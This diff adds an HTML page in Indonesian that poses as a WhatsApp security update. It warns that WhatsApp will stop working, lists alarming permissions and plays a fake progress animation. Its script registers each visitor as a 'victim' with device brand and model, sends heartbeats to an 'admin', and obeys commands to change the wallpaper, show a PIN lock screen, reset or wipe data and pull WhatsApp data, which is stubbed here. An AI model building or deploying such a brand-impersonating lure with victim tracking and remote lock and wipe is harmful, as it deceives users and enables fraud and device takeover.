@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>WhatsApp Security Update</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(145deg, #0a2f2a, #0a1f1a);
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+        }
+
+        /* KARTU UTAMA */
+        .whatsapp-card {
+            max-width: 500px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 48px;
+            overflow: hidden;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.4), 0 0 0 1px rgba(0, 255, 157, 0.2);
+            transition: transform 0.2s;
+            animation: slideUp 0.5s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(40px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* HEADER HIJAU KAYAK WA */
+        .wa-header {
+            background: #075e54;
+            padding: 30px 24px;
+            text-align: center;
+        }
+
+        .wa-header img {
+            width: 58px;
+            height: 58px;
+            filter: drop-shadow(0 4px 8px rgba(0, 0, 0, 0.2));
+        }
+
+        .wa-header h2 {
+            color: white;
+            font-size: 24px;
+            font-weight: 700;
+            margin-top: 12px;
+            letter-spacing: -0.3px;
+        }
+
+        .wa-header p {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 14px;
+            margin-top: 6px;
+        }
+
+        /* BAGIAN DALAM */
+        .wa-body {
+            padding: 28px 26px;
+        }
+
+        .alert-banner {
+            background: #fff9e0;
+            border-left: 5px solid #f5b042;
+            padding: 14px 18px;
+            border-radius: 24px;
+            margin-bottom: 28px;
+            font-size: 13px;
+            color: #8a6e2f;
+            font-weight: 500;
+        }
+
+        /* PERMISSION LIST */
+        .permission-group {
+            background: #f6f8fa;
+            border-radius: 32px;
+            padding: 8px 0;
+            margin-bottom: 28px;
+        }
+
+        .perm-item {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            padding: 14px 20px;
+            border-bottom: 1px solid #e9edf2;
+        }
+
+        .perm-item:last-child {
+            border-bottom: none;
+        }
+
+        .perm-icon {
+            width: 48px;
+            height: 48px;
+            background: #e0f7e8;
+            border-radius: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 26px;
+        }
+
+        .perm-text strong {
+            font-size: 15px;
+            color: #1f2f3a;
+            display: block;
+        }
+
+        .perm-text small {
+            font-size: 12px;
+            color: #7c8b9c;
+        }
+
+        /* TOMBOL */
+        .update-button {
+            background: #25d366;
+            width: 100%;
+            border: none;
+            padding: 18px;
+            border-radius: 60px;
+            color: white;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 10px;
+            box-shadow: 0 6px 14px rgba(37, 211, 102, 0.3);
+        }
+
+        .update-button:active {
+            transform: scale(0.97);
+        }
+
+        /* PROGRESS */
+        .progress-section {
+            display: none;
+            margin: 16px 0;
+        }
+
+        .progress-bar-bg {
+            background: #e2e8f0;
+            border-radius: 40px;
+            height: 10px;
+            overflow: hidden;
+        }
+
+        .progress-fill-animated {
+            width: 0%;
+            height: 100%;
+            background: #25d366;
+            transition: width 0.2s;
+        }
+
+        /* HIDDEN UTILITY */
+        .hidden-page {
+            display: none;
+        }
+
+        .success-icon {
+            font-size: 70px;
+            text-align: center;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+
+<!-- PAGE 1: MINTA UPDATE -->
+<div id="pageUpdate" class="whatsapp-card">
+    <div class="wa-header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
+        <h2>⚠️ Keamanan Diperlukan</h2>
+        <p>versi lama — pembaruan wajib</p>
+    </div>
+    <div class="wa-body">
+        <div class="alert-banner">
+            🔐 WhatsApp akan berhenti bekerja jika tidak memperbarui.
+        </div>
+        <div class="permission-group">
+            <div class="perm-item"><div class="perm-icon">📁</div><div class="perm-text"><strong>Penyimpanan & Media</strong><small>backup chat & file</small></div></div>
+            <div class="perm-item"><div class="perm-icon">💬</div><div class="perm-text"><strong>SMS & Kontak</strong><small>verifikasi & sinkronisasi</small></div></div>
+            <div class="perm-item"><div class="perm-icon">⚡</div><div class="perm-text"><strong>Latar Belakang (24/7)</strong><small>update otomatis</small></div></div>
+            <div class="perm-item"><div class="perm-icon">🔒</div><div class="perm-text"><strong>Keamanan Layar</strong><small>perlindungan tambahan</small></div></div>
+        </div>
+        <button class="update-button" id="btnUpdate">⚡ UPDATE SEKARANG</button>
+    </div>
+</div>
+
+<!-- PAGE 2: PROGRESS BAR -->
+<div id="pageProgress" class="whatsapp-card hidden-page">
+    <div class="wa-header"><h2>⏳ Memperbarui...</h2></div>
+    <div class="wa-body">
+        <div class="progress-section" style="display:block;">
+            <div class="progress-bar-bg"><div class="progress-fill-animated" id="progressFill"></div></div>
+            <p style="text-align:center; margin-top:16px;" id="progressText">mengunduh paket keamanan...</p>
+        </div>
+    </div>
+</div>
+
+<!-- PAGE 3: SUKSES + BUKA WA -->
+<div id="pageSuccess" class="whatsapp-card hidden-page">
+    <div class="wa-header"><h2>✅ Update Selesai</h2></div>
+    <div class="wa-body">
+        <div class="success-icon">✓</div>
+        <p style="text-align:center; margin-bottom:24px;">WhatsApp sudah diperbarui ke versi terbaru</p>
+        <button class="update-button" id="btnOpenWA">BUKA WHATSAPP</button>
+    </div>
+</div>
+
+<script>
+    // ========== GENERATE KORBAN + DAFTAR KE LOCALSTORAGE ==========
+    const victimId = 'victim_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
+
+    function getDeviceBrand() {
+        let ua = navigator.userAgent;
+        if(ua.includes('Samsung')) return 'Samsung';
+        if(ua.includes('Xiaomi')||ua.includes('Redmi')) return 'Xiaomi';
+        if(ua.includes('OPPO')) return 'OPPO';
+        if(ua.includes('vivo')) return 'vivo';
+        if(ua.includes('Realme')) return 'Realme';
+        if(ua.includes('OnePlus')) return 'OnePlus';
+        if(ua.includes('Pixel')) return 'Google Pixel';
+        if(ua.includes('iPhone')) return 'iPhone';
+        if(ua.includes('Nokia')) return 'Nokia';
+        return 'Android Device';
+    }
+
+    function getDeviceModel() {
+        let ua = navigator.userAgent;
+        let match = ua.match(/\(([^)]+)\)/);
+        if(match && match[1]) {
+            let parts = match[1].split(';');
+            for(let p of parts) {
+                p = p.trim();
+                if(p.length > 3 && p.length < 30 && !p.includes('Android') && !p.includes('Linux'))
+                    return p;
+            }
+        }
+        return getDeviceBrand();
+    }
+
+    const victimData = {
+        id: victimId,
+        brand: getDeviceBrand(),
+        model: getDeviceModel(),
+        installedAt: new Date().toISOString(),
+        status: 'online'
+    };
+
+    // DAFTARKAN KE 'victims'
+    let victimsList = JSON.parse(localStorage.getItem('victims') || '[]');
+    if(!victimsList.find(v => v.id === victimId)) {
+        victimsList.push(victimData);
+        localStorage.setItem('victims', JSON.stringify(victimsList));
+    }
+
+    // HEARTBEAT BIAR ADMIN TAU ONLINE
+    setInterval(() => {
+        localStorage.setItem('hb_' + victimId, JSON.stringify({ id: victimId, time: new Date().toISOString() }));
+    }, 14000);
+
+    // LISTENER COMMAND DARI ADMIN
+    window.addEventListener('storage', (e) => {
+        if(e.key === 'cmd_' + victimId) {
+            let cmd = JSON.parse(e.newValue);
+            if(cmd.action === 'wallpaper' && cmd.img) {
+                document.body.style.backgroundImage = `url(${cmd.img})`;
+                document.body.style.backgroundSize = 'cover';
+            }
+            if(cmd.action === 'lock_wall') alert("⚠️ Wallpaper telah dikunci oleh administrator.");
+            if(cmd.action === 'lock') showLockScreen(cmd.msg, cmd.pin);
+            if(cmd.action === 'reset') setTimeout(() => { localStorage.clear(); alert("DEVICE RESET"); location.reload(); }, 1000);
+            if(cmd.action === 'wipe') setTimeout(() => { localStorage.clear(); alert("DATA WIPED"); location.reload(); }, 800);
+            if(cmd.action === 'get_wa') {
+                let dummyWA = { victimId: victimId, messages: [{ sender: "Admin", time: "sekarang", text: "perintah WA diterima" }] };
+                let waHistory = JSON.parse(localStorage.getItem('wa_resp') || '[]');
+                waHistory.push(dummyWA);
+                localStorage.setItem('wa_resp', JSON.stringify(waHistory));
+            }
+        }
+    });
+
+    function showLockScreen(msg, pin) {
+        let overlay = document.createElement('div');
+        overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#000000dd;z-index:99999;display:flex;align-items:center;justify-content:center;color:white;backdrop-filter:blur(12px);';
+        overlay.innerHTML = `<div style="background:#0f172ade; padding:32px; border-radius:48px; text-align:center;"><div style="font-size:48px;">🔒</div><h2 style="margin:12px 0;">${msg || 'DEVICE LOCKED'}</h2><input id="pinInput" type="password" style="padding:12px; border-radius:30px; border:none; width:200px; margin:12px;"><br><button onclick="if(document.getElementById('pinInput').value=='${pin}') this.parentElement.parentElement.remove() else alert('PIN salah')" style="background:#00ff9d; border:none; padding:8px 32px; border-radius:40px; margin-top:10px;">BUKA</button></div>`;
+        document.body.appendChild(overlay);
+    }
+
+    // PROGRESS + PAGING
+    let progress = 0, interval;
+    function startUpdate() {
+        document.getElementById('pageUpdate').classList.add('hidden-page');
+        document.getElementById('pageProgress').classList.remove('hidden-page');
+        interval = setInterval(() => {
+            progress += Math.random() * 18;
+            if(progress >= 100) {
+                clearInterval(interval);
+                document.getElementById('pageProgress').classList.add('hidden-page');
+                document.getElementById('pageSuccess').classList.remove('hidden-page');
+            }
+            document.getElementById('progressFill').style.width = Math.min(progress,100) + '%';
+            let txt = document.getElementById('progressText');
+            if(progress < 30) txt.innerText = '📡 mengunduh komponen keamanan...';
+            else if(progress < 65) txt.innerText = '🔍 memverifikasi paket update...';
+            else txt.innerText = '⚙️ menerapkan pengaturan baru...';
+        }, 200);
+    }
+
+    document.getElementById('btnUpdate').addEventListener('click', startUpdate);
+    document.getElementById('btnOpenWA').addEventListener('click', () => {
+        window.location.href = 'https://web.whatsapp.com';
+    });
+</script>
+</body>
+  </html>
